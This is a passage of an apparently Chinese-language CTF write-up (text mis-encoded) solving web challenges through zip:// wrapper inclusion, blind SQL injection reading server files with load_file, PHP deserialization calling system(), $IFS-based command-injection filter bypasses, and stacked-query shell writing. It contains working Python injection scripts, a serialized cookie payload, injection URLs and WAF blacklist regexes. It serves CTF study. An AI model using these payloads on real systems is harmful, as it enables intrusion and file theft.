class="keyword">if</span> status ==<span class="number">200</span>:</span><br><span class="line"><span class="keyword">print</span> path</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>çˆ†å‡ºè·¯å¾„<br><code>uploads/cf0dd54323ba204f8151905e912964c1.jpg</code><br>æœ€åçš„å…³é”®ç‚¹æ˜¯åˆ©ç”¨ä¼ªåè®®è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡ŒåŒæ ·çš„ä¹Ÿå¯ä»¥ä½¿ç”¨pharï¼Œå…³é”®æ˜¯æŠŠ%23æ”¹ä¸º/å°±å¥½ï¼Œæ³¨æ„è¿™é‡Œä¸éœ€è¦å¯¹æ–‡ä»¶åŠ ä¸Šç›¸å…³çš„åç¼€<br><code>http://101.71.29.5:10007/index.php?page=zip://./uploads/cf0dd54323ba204f8151905e912964c1.jpg%23over</code><br><a href="https://imgchr.com/i/FmQfYT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQfYT.md.png" alt="FmQfYT.md.png"></a><br>å¾—åˆ°flag<br><a href="https://imgchr.com/i/FmQo6J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQo6J.md.png" alt="FmQo6J.md.png"></a><br><code>flag{3809f2ce999b4d99c8051e285505a014}</code></p><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><p>è¿™ä¸€é¢˜è´¨é‡å¾ˆå¥½å“‡ï¼Œè€ƒäº†SQLæ³¨å…¥è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œå‘½ä»¤è¡Œæ‰§è¡Œçš„ç»•è¿‡</p><p>å…ˆçœ‹çœ‹æ³¨å…¥ç‚¹ï¼Œè¿™é‡Œæ³¨å†Œè¿›å»ä¹‹ååœ¨ç”¨æˆ·ä¿¡æ¯é‡Œé¢æ˜æ˜¾çœ‹åˆ°idå‚æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼Œè¿™é‡Œé€šè¿‡è¿™æ¬¡ä¸¤ä¸ªé¢˜ç›®çš„æ³¨å…¥ï¼Œå¯ä»¥å­¦åˆ°åˆ°å…ˆè¦æ ¹æ®æ•°æ®åº“è¿”å›çš„ä¿¡æ¯æ¥åšå‡ºè‡ªå·±çš„åˆ¤æ–­ï¼Œæ¯”å¦‚æŸ¥åˆ°ä¼šå›æ˜¾ä»€ä¹ˆï¼ŒæŸ¥ä¸åˆ°åˆä¼šå›æ˜¾ä»€ä¹ˆï¼Œè¯­æ³•é”™è¯¯åˆä¼šå›æ˜¾ä»€ä¹ˆç­‰ç­‰ï¼Œæ ¹æ®è¿™ä¸ªä¸œè¥¿å»åšå‡ºåˆ¤æ–­åº”è¯¥ä½œä½•æ³¨å…¥</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç‚¹ä¹Ÿæ˜¯å­¦åˆ°çš„å°±æ˜¯æ€ä¹ˆæµ‹è¯•ä»–æ˜¯ç”¨æ›¿æ¢è¿˜æ˜¯åˆ é™¤æ¥è¿‡æ»¤é»‘åå•ï¼Œæˆ‘ä»¬åªéœ€è¦å†æ³¨å†Œçš„åœ°æ–¹æ”¾è¾“å…¥ç±»ä¼¼<code>select</code>ä¹‹ç±»çš„å…³é”®å­—å°±ä¼šåœ¨ç”¨æˆ·é¡µé¢å‘ç°è¢«æ›¿æ¢æˆ<code>@</code>ã€‚ä¸‹ä¸€ä¸ªé¢˜ç›®ä¹Ÿæ˜¯ç±»ä¼¼çš„é“ç†ã€‚</p><p>è¿™ä¸€ä¸ªé¢˜å¯ä»¥æœ‰ä¸¤ç§æ„é€ å¸ƒå°”ç›²æ³¨çš„æ€è·¯ä¸€ç§æ˜¯åˆ©ç”¨<code>limit</code>ï¼Œå¦ä¸€ç§æ˜¯ç”¨åŠ å‡å·ç­‰è¿ç®—ç¬¦å·ï¼Œè¿™é‡ŒåŒæ ·æ˜¯å¾ˆå¥½çš„å­¦ä¹ ç‚¹</p><p>å¯ä»¥æ¥æ„é€ SQLè¯»æ–‡ä»¶çš„è¯­å¥äº†<br>è¿™é‡Œè¿™æ ·æ„é€ <code>http://101.71.29.5:10015/user/user.php?id=1-1</code>æ ¹æ®è¿™é‡Œçš„å‡1è¿˜æ˜¯å‡0å»åˆ¤æ–­æ˜¯å¦å­˜åœ¨æˆ‘ä»¬çŒœæµ‹çš„æ–‡ä»¶<br>é¦–å…ˆå¾—äº†è§£ä¸€ä¸‹å½“æ•°æ®åº“é‡Œé¢<code>secure_file_priv</code>çš„å€¼æ˜¯ç©ºçš„è¯ï¼Œå°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶<br><img src="https://s1.ax1x.com/2018/11/30/FmlRud.png" alt="FmlRud.png"><br>å¼€å§‹æ„é€ è¯­å¥<br><code>http://101.71.29.5:10015/user/user.php?id=1-(load_file(&#39;/var/www/html/index.php&#39;) like &#39;&lt;%&#39;)</code><br>ä½†æ˜¯ä¸èƒ½å‡ºç°å¼•å·16è¿›åˆ¶è½¬ä¸€ä¸‹<br><code>http://101.71.29.5:10015/user/user.php?id=1-(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870) like 0x3c25)</code><br>åˆå› ä¸ºè¯»æ–‡ä»¶çš„æ—¶å€™ä¼šå‡ºç°æ¢è¡Œç­‰é—®é¢˜è€Œä¸èƒ½å…¨è¯»å–å› æ­¤å°†loadfileçš„å†…å®¹16è¿›åˆ¶è½¬ä¸€ä¸‹<br><code>http://101.71.29.5:10015/user/user.php?id=1-(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)) like 0x3c25)</code></p><p>æ¨¡ä»¿ç€å†™ä¸€ä¸ªè„šæœ¬ï¼Œè¿™é‡Œæœ‰ç‚¹ä¸æ˜ç™½çš„æ˜¯ä¸ºä»€ä¹ˆè¿™é‡Œçš„è„šæœ¬ä¼ è¿›å»çš„å­—ç¬¦å·²ç»æ˜¯16è¿›åˆ¶å­—ç¬¦ä¸ºæ¯›è¿˜å¾—hexä¸€æ¬¡ï¼Ÿé™¤äº†é‚£ä¸ª<code>%</code>ç¡®å®éœ€è¦16è¿›åˆ¶è½¬ä¸€ä¸‹ï¼Œä½†æ˜¯æˆ‘è¯•äº†ä¸€ä¸‹ä¸hexçš„è¯ä¸èƒ½è·‘å‡ºæ¥ï¼Œæœ‰å¤§ä½¬å‘Šè¯‰ä¸€ä¸‹æˆ‘åŸå› å—23333.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">hex_s = <span class="keyword">lambda</span> s:binascii.hexlify(s)</span><br><span class="line">s = <span class="string">'ABCDEF'</span> + string.digits</span><br><span class="line">filename = <span class="string">'/var/www/html/index.php'</span></span><br><span class="line"><span class="comment">#filename = '/var/www/html/config/waf.php'</span></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://101.71.29.5:10015/user/user.php?id=2-if(hex(load_file(0x%s)) like 0x%s,1,2)'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">10000</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">payload = ans + j + <span class="string">'%'</span></span><br><span class="line">_url = url % (hex_s(filename),hex_s(payload))</span><br><span class="line"><span class="comment">#print _url</span></span><br><span class="line">con = requests.get(_url, cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"vn7dm5pk3dqvicrkg43om69hi0"</span>&#125;)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'2018'</span> <span class="keyword">in</span> con.content:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'...'</span>+payload</span><br><span class="line">ans = ans + j</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>ç„¶åå¾—åˆ°index.phpçš„å…³é”®ä»£ç <br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config/sys_config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'header.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'CONFIG'</span>]))&#123;</span><br><span class="line">    $config = $_COOKIE[<span class="string">'CONFIG'</span>];</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config/config.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>å†å»è¯»å–config.phpé‡Œé¢çš„å†…å®¹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config = unserialize(base64_decode($config));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line">    $p=$_GET[<span class="string">'p'</span>];</span><br><span class="line">    $config-&gt;$p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $config;</span><br><span class="line">    <span class="keyword">private</span> $path;</span><br><span class="line">    <span class="keyword">public</span> $filter;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConfig</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;config == <span class="string">""</span>)&#123;</span><br><span class="line">            $config = <span class="keyword">isset</span>($_POST[<span class="string">'config'</span>])?$_POST[<span class="string">'config'</span>]:<span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SetFilter</span><span class="params">($value)</span></span>&#123;</span><br><span class="line"><span class="comment">//        echo $value;</span></span><br><span class="line">$value=waf_exec($value); </span><br><span class="line">        var_dump($value);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter)&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;filter <span class="keyword">as</span> $filter)&#123;</span><br><span class="line"></span><br><span class="line">                </span><br><span class="line">                $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = <span class="keyword">array</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="comment">//var_dump($key);</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;SetFilter($key);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿˜æœ‰ä¸€ä¸ªwaf.php,å¯¹ä¸Šé¢çš„$valueå€¼è¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿™é‡Œå¯¹å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å¸¸ç”¨è¯­å¥è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œç»•è¿‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $black_str = <span class="string">"/(and|into|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"</span>;</span><br><span class="line">        $str = preg_replace($black_str, <span class="string">"@@"</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> addslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+|\/| )/i"</span>;</span><br><span class="line">        $str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œçš„å…³é”®æ˜¯åˆ†æ<code>config.php</code>é‡Œé¢çš„ä»£ç ï¼Œä¸€çœ‹é‡Œé¢å­˜åœ¨<code>unserialize</code>è¿™æ ·çš„ä¸œè¥¿ï¼Œå°±åº”è¯¥è€ƒå¯Ÿçš„æ˜¯ååºåˆ—åŒ–ï¼Œä½†æ˜¯è¿™é‡Œè€ƒçš„ç‚¹ä¸æ˜¯é­”æ³•å‡½æ•°ï¼Œå› ä¸ºæ„é€ å‡½æ•°é‡Œä¸å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œä½†æ˜¯åœ¨<code>SetFilter</code>è¿™ä¸ªæ–¹æ³•é‡Œé¢å­˜åœ¨<code>call_user_func</code>è¿™æ ·çš„å›è°ƒå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ä½ æƒ³è¦æ‰§è¡Œçš„å‡½æ•°åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦ä¼ è¿›å»è¯¥å‡½æ•°çš„å‚æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥å»æ‰§è¡Œå‘½ä»¤<br>å…ˆæ„é€ ç±»<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$over  = <span class="keyword">new</span> Config();</span><br><span class="line">$over-&gt;filter = <span class="keyword">array</span>(<span class="string">"system"</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($over));</span><br></pre></td></tr></table></figure></p><p>ç°åœ¨çš„å…³é”®ç‚¹æ˜¯å¯¹<code>$value</code>èµ‹å€¼ï¼Œè¿™ä¸ªä¸œä¸œé€šè¿‡ <code>SetFilter</code>è¿™ä¸ªæ–¹æ³•å»ä¼ å‚ï¼Œå¾€ä¸Šæ˜¯é€šè¿‡<code>__get</code>å»è°ƒç”¨çš„<br>è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯å¯ä»¥è°ƒç”¨ç±»é‡Œé¢çš„ç§æœ‰å˜é‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æœªå®šä¹‰çš„å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œç„¶åconfigå‚æ•°æ˜¯é€šè¿‡<code>cookie</code>ä¼ å‚çš„ï¼ŒæŠŠæ„é€ å¥½çš„åºåˆ—åŒ–æ”¾è¿›<code>cookie</code>é‡Œé¢<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG=Tzo2OiJDb25maWciOjM6e3M6MTQ6IgBDb25maWcAY29uZmlnIjtzOjA6IiI7czoxMjoiAENvbmZpZwBwYXRoIjtOO3M6NjoiZmlsdGVyIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX0=</span><br></pre></td></tr></table></figure></p><p>å°è¯•<code>ls</code>å‘½ä»¤ï¼Œå‡ºç°flagå­—æ ·çš„ä¸œä¸œï¼Œä½†å…¶å®è¿™æ˜¯ä¸ªæ–‡ä»¶å¤¹ï¼Œå¯ä»¥ç”¨ls -l æŸ¥çœ‹ä¸€ä¸‹<br><a href="https://imgchr.com/i/FmlI4f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmlI4f.md.png" alt="FmlI4f.md.png"></a></p><p>ä½†æ˜¯å› ä¸ºç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç”¨$IFSç»•è¿‡,åŒæ ·åœ°/ä¹Ÿè¢«è¿‡æ»¤äº†åŒæ ·éœ€è¦ç»•è¿‡ï¼Œè¿™é‡Œç”¨<code>expr substr $(pwd) 1 1</code>å»ç»•è¿‡<br>æ³¨æ„è¿™é‡Œé¢çš„ç©ºæ ¼ä¹Ÿå¾—å˜æˆ<code>$IFS</code>ï¼Œä½†æ˜¯ç›´æ¥å˜æˆ<code>expr$IFSsubstr$IFS$(pwd)$IFS1$IFS1</code>ä¹Ÿä¸è¡Œï¼Œå› ä¸ºç³»ç»Ÿè¾¨åˆ«å‡ºä¸å‡ºï¼Œä¼šå‡ºç°è¿™æ ·çš„ç»“æœ<br><img src="https://s1.ax1x.com/2018/11/30/FmlbvQ.png" alt="FmlbvQ.png"><br>æ‰€ä»¥å¾—ç”¨<code>\</code>åˆ†å‰²ä¸€ä¸‹<br><img src="https://s1.ax1x.com/2018/11/30/FmlLuj.png" alt="FmlLuj.png"><br>å¾—åˆ°è·¯å¾„ä¸‹å­˜åœ¨flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(54) &quot;ls$IFS.`expr$IFS\substr$IFS$(pwd)$IFS\1$IFS\1`flag2333&quot; flag.php</span><br></pre></td></tr></table></figure></p><p>å¼€å§‹å°è¯•è¯»å–æ–‡ä»¶äº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10015/index.php?p=cat$IFS.`expr$IFS\substr$IFS$(pwd)$IFS\1$IFS\1`flag2333`expr$IFS\substr$IFS$(pwd)$IFS\1$IFS\1`flag.php</span><br></pre></td></tr></table></figure></p><p>è·å¾—flag<br><a href="https://imgchr.com/i/FmlXbn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmlXbn.md.png" alt="FmlXbn.md.png"></a><br><code>flag{d6e29836ea0e962b0b00c3bf9292b5ad}</code></p><h3 id="write-a-shell"><a href="#write-a-shell" class="headerlink" title="write a shell"></a>write a shell</h3><p>è¿™ä¸€é¢˜ä¹Ÿæ˜¯è¦æµ‹è¯•å‡ºæ¥å¯ä»¥ç”¨loadfileè¯»æ–‡ä»¶ï¼Œå…ˆæŠŠæ–‡ä»¶è¯»å‡ºæ¥ï¼Œå†™äº†ä¸ªè„šæœ¬è¯»æ–‡ä»¶ï¼Œè¯»çš„æ˜¯<code>user.php</code>çš„é¡µé¢æºç ï¼Œå‰ææ˜¯å¾—æœ‰è¶…è¿‡127çš„ç”¨æˆ·æ³¨å†Œæ‰å¯ä»¥å¾ˆé¡ºåˆ©åœ°è¯»å–æºç ï¼Œå¦‚æœä¸å¤Ÿå¯ä»¥è‡ªå·±å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">"http://101.71.29.5:10011/user/user.php?id=ascii(mid(load_file(0x2f7661722f7777772f68746d6c2f757365722f757365722e706870),&#123;_&#125;,1))"</span></span><br><span class="line">con = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">100000</span>):</span><br><span class="line">ans=requests.get(url.format(_=str(i)),cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'bvbjr3qjrktp6qfn393f6itso0'</span>&#125;)</span><br><span class="line">s = re.findall(<span class="string">r"&lt;h1&gt;user_id:(.*?)&lt;/h1&gt;"</span>,ans.content)</span><br><span class="line">con = con+chr(int(s[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">print</span> con</span><br></pre></td></tr></table></figure></p><p>è¯»å‡ºæ¥ä¸€éƒ¨åˆ†å…³é”®ä»£ç æ˜¯è¿™æ ·å­çš„<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../bwvs_config/sys_config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'user_name'</span>])) &#123;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'../header.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($SESSION[<span class="string">'user_id'</span>])) &#123;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE user_name ="</span>.<span class="string">"'&#123;$_SESSION['user_name']&#125;'"</span>;</span><br><span class="line">$data = mysqli_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Mysql Error!!'</span>);</span><br><span class="line">$result = mysqli_fetch_array($data);</span><br><span class="line">$_SESSION[<span class="string">'user_id'</span>] = $result[<span class="string">'user_id'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$html_avatar = htmlspecialchars($_SESSION[<span class="string">'user_favicon'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">$id=waf($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM dwvs_user_message WHERE user_id ="</span>.$id;</span><br><span class="line">$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($result = mysqli_store_result($connect))&#123;</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;user_id:'</span>.$row[<span class="number">0</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:"</span>.$row[<span class="number">1</span>].<span class="string">"&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;</span></span><br></pre></td></tr></table></figure></p><p>åŒæ ·çš„é“ç†æˆ‘ä»¬å¯ä»¥æŠŠbwvs_config/waf.phpé‡Œé¢çš„å†…å®¹è¯»å‡ºæ¥ï¼Œå¯ä»¥çœ‹åˆ°è¿‡æ»¤çš„å†…å®¹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;]|\^)/i"</span>;</span><br><span class="line">$str = preg_replace(<span class="string">'/@/'</span>,<span class="string">'@-@'</span>,$str);</span><br><span class="line">$str = preg_replace($black_str, <span class="string">"@"</span>,$str);</span><br><span class="line"><span class="keyword">return</span> addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>é¢˜ç›®æç¤ºè¦å†™shellï¼Œå°±éœ€è¦æ‰¾å¯ä»¥å†™shellçš„æ–‡ä»¶è·¯å¾„ï¼Œä½†å¾—æ‰¾åˆ°å…·æœ‰å†™æƒé™çš„æ–‡ä»¶å¤¹æ‰å¯ä»¥æ‰§è¡Œï¼Œè¿™é‡Œçš„å…³é”®ç‚¹æ˜¯åˆ©ç”¨è¿™æ®µä»£ç mysqli_multi_queryçš„å¤šè¡Œæ‰§è¡Œè¯­å¥å»æ‰§è¡Œç›¸å…³çš„å†™æ“ä½œã€‚<br>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯SQLçš„é¢„ç¼–è¯‘è¯­å¥ï¼Œé€šè¿‡å®šä¹‰å˜é‡åçš„æ–¹å¼ï¼Œç”¨executeè¯­å¥å»æ‰§è¡Œç›¸å…³æ“ä½œ<br>é¢„åˆ¶è¯­å¥çš„SQLè¯­æ³•åŸºäºä¸‰ä¸ªSQLè¯­å¥ï¼š<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">EXECUTE</span> stmt_name [<span class="keyword">USING</span> @var_name [, @var_name] ...];</span><br><span class="line">  </span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure></p><p>åœ¨è‡ªå·±æœºå­ä¸Šè¯•ä¸€ä¸‹<br><a href="https://imgchr.com/i/Fm1Mxe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm1Mxe.md.png" alt="Fm1Mxe.md.png"></a><br>å› æ­¤å¯ä»¥æ¥æ„é€ ä¸€ä¸‹è¯­å¥<code>PREPARE over FROM &quot;select * from 